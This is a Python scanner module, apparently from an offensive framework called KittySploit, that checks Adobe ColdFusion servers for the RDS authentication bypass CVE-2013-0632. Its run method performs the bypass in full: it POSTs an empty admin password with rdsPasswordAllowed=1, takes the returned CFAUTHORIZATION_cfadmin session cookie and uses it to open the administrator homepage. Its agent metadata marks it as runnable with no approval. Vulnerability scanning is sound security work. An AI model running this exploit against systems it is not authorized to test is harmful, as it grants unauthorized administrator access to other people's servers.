#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe ColdFusion RDS auth bypass (CVE-2013-0632)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ColdFusion - RDS Auth Bypass Detection (CVE-2013-0632)',
        'description': (
            'Detects CVE-2013-0632 by POSTing adminpassword=&rdsPasswordAllowed=1 to '
            'administrator.cfc?method=login and accessing the admin homepage.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'coldfusion', 'adobe', 'auth-bypass', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-0632',
        ],
        'cve': 'CVE-2013-0632',
    }

    def run(self):
        path = '/CFIDE/adminapi/administrator.cfc?method=login'
        r = self.http_request(
            method='POST',
            path=path,
            data='adminpassword=&rdsPasswordAllowed=1',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if '<wddxPacket' not in body or "'true'" not in body:
            return False
        cookie = None
        for k, v in r.headers.items():
            if k.lower() == 'set-cookie' and 'CFAUTHORIZATION_cfadmin=' in v:
                cookie = v.split(';')[0].strip()
                break
        if not cookie:
            m = re.search(
                r'CFAUTHORIZATION_cfadmin=([^;]+)',
                '\n'.join(f'{a}: {b}' for a, b in r.headers.items()),
            )
            if m:
                cookie = 'CFAUTHORIZATION_cfadmin=' + m.group(1)
        if not cookie:
            return False
        g = self.http_request(
            method='GET',
            path='/CFIDE/administrator/homepage.cfm',
            headers={'Cookie': cookie},
            allow_redirects=False,
        )
        if g and 'ColdFusion Administrator Home Page' in (g.text or '') and 'Welcome to the ColdFusion Administrator' in (g.text or ''):
            self.set_info(
                severity='critical',
                reason='ColdFusion RDS auth bypass (CVE-2013-0632)',
                path=path,
            )
            return True
        return False
